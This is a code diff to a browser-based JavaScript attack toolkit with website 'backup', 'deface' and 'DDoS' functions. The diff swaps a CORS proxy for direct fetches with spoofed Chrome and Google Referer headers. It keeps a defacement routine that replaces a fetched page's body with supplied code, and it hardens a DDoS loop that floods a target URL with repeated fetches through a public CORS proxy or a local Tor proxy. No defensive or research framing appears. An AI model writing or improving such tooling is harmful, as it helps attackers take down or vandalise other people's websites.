@@ -456,8 +456,8 @@
  
 
      function setSecurityHeaders() {
+         // Secure Headers
          console.warn("Security Headers need server-side config.");
-         // In a real environment, configure these on the server
      }
      setSecurityHeaders();
  
@@ -493,34 +493,38 @@
          logAction(`Backing up website: ${url}`);
  
 
-         // Using a CORS proxy for demonstration purposes
-         const corsProxy = 'https://corsproxy.io/?';
- 
-
-         fetch(corsProxy + encodeURIComponent(url))
-             .then(response => {
-                 if (!response.ok) {
-                     throw new Error(`HTTP error! status: ${response.status}`);
-                 }
-                 return response.text();
-             })
-             .then(html => {
-                 const blob = new Blob([html], { type: 'text/html' });
-                 const a = document.createElement('a');
-                 a.href = URL.createObjectURL(blob);
-                 a.download = 'website_backup.html';
-                 document.body.appendChild(a);
-                 a.click();
-                 document.body.removeChild(a);
-                 URL.revokeObjectURL(a.href);
-                 console.log('Website backed up successfully.');
-                 logAction('Website backed up successfully.');
-             })
-             .catch(error => {
-                 console.error('Error backing up website:', error);
-                 alert('Failed to backup website. Check console for details.');
-                 logAction(`Error backing up website: ${error}`);
-             });
+         // Fetch the website content and create a downloadable backup file
+         fetch(url, {
+             method: 'GET',
+             mode: 'cors',
+             headers: {
+                 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
+                 'Referer': 'https://www.google.com/'
+             }
+         })
+         .then(response => {
+             if (!response.ok) {
+                 throw new Error(`HTTP error! Status: ${response.status}`);
+             }
+             return response.text();
+         })
+         .then(html => {
+             const blob = new Blob([html], { type: 'text/html' });
+             const a = document.createElement('a');
+             a.href = URL.createObjectURL(blob);
+             a.download = 'website_backup.html';
+             document.body.appendChild(a);
+             a.click();
+             document.body.removeChild(a);
+             URL.revokeObjectURL(a.href);
+             console.log('Website backed up successfully.');
+             logAction('Website backed up successfully.');
+         })
+         .catch(error => {
+             console.error('Error backing up website:', error);
+             alert('Failed to backup website. Check console for details.');
+             logAction(`Error backing up website: ${error}`);
+         });
      }
  
 
@@ -543,48 +547,53 @@
          logAction(`Attempting to deface: ${url} with code.`);
  
 
-         // Using a CORS proxy for demonstration purposes
-         const corsProxy = 'https://corsproxy.io/?';
+         // Attempt to modify the website directly (this will likely be blocked by CORS in most browsers)
+         fetch(url, {
+             method: 'GET',
+             mode: 'cors',
+             headers: {
+                 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
+                 'Referer': 'https://www.google.com/'
+             }
+         })
+         .then(response => {
+             if (!response.ok) {
+                 throw new Error(`HTTP error! Status: ${response.status}`);
+             }
+             return response.text();
+         })
+         .then(html => {
+             const parser = new DOMParser();
+             const doc = parser.parseFromString(html, 'text/html');
  
 
-         fetch(corsProxy + encodeURIComponent(url))
-             .then(response => {
-                 if (!response.ok) {
-                     throw new Error(`HTTP error! status: ${response.status}`);
-                 }
-                 return response.text();
-             })
-             .then(html => {
-                 const parser = new DOMParser();
-                 const doc = parser.parseFromString(html, 'text/html');
+             if (doc.body) {
+                 doc.body.innerHTML = code;
+             } else {
+                 console.error('Body element not found.');
+                 alert('Could not apply defacement: Body not found.');
+                 logAction('Could not apply defacement: Body not found.');
+                 return;
+             }
  
 
-                 if (doc.body) {
-                     doc.body.innerHTML = code;
-                 } else {
-                     console.error('Body element not found.');
-                     alert('Could not apply defacement: Body not found.');
-                     logAction('Could not apply defacement: Body not found.');
-                     return;
-                 }
- 
-
-                 const modifiedHtml = new XMLSerializer().serializeToString(doc);
-                 document.getElementById('defacement-preview').innerHTML = modifiedHtml;
-                 alert('Defacement applied. Preview updated.');
-                 logAction('Defacement applied. Preview updated.');
-             })
-             .catch(error => {
-                 console.error('Error defacing website:', error);
-                 alert('Failed to deface website. Check console.');
-                 logAction(`Error defacing website: ${error}`);
-             });
+             const modifiedHtml = new XMLSerializer().serializeToString(doc);
+             document.getElementById('defacement-preview').innerHTML = modifiedHtml;
+             alert('Defacement applied. Preview updated.');
+             logAction('Defacement applied. Preview updated.');
+         })
+         .catch(error => {
+             console.error('Error defacing website:', error);
+             alert('Failed to deface website. Check console.');
+             logAction(`Error defacing website: ${error}`);
+         });
      }
  
 
      // DDoS Tool
      let ddosInterval;
      let ddosStartTime;
+     let isDDoSRunning = false;
  
 
      function startDDoS() {
@@ -597,18 +606,25 @@
          }
  
 
+         if (isDDoSRunning) {
+             alert("DDoS attack is already running.");
+             return;
+         }
+ 
+
          ddosStartTime = Date.now();
          updateDDoSTimer();
+         isDDoSRunning = true;
  
 
          ddosInterval = setInterval(() => {
              for (let i = 0; i < threads; i++) {
                  let targetUrl = url;
                  if (isOnion) {
-                     // Tor proxy setup (replace with your Tor proxy)
+                     // Tor proxy setup (replace with your Tor proxy - ensure Tor is running)
                      targetUrl = 'http://127.0.0.1:8118/' + url;
                  } else {
-                     // Using a CORS proxy for demonstration purposes
+                     // Using a CORS proxy (but note this is not suitable for real DDoS)
                      targetUrl = 'https://corsproxy.io/?' + encodeURIComponent(url);
                  }
                  fetch(targetUrl, { mode: 'no-cors' })
@@ -631,6 +647,7 @@
 
      function stopDDoS() {
          clearInterval(ddosInterval);
+         isDDoSRunning = false;
          console.log("DDoS attack stopped.");
          logAction("DDoS attack stopped.");
      }
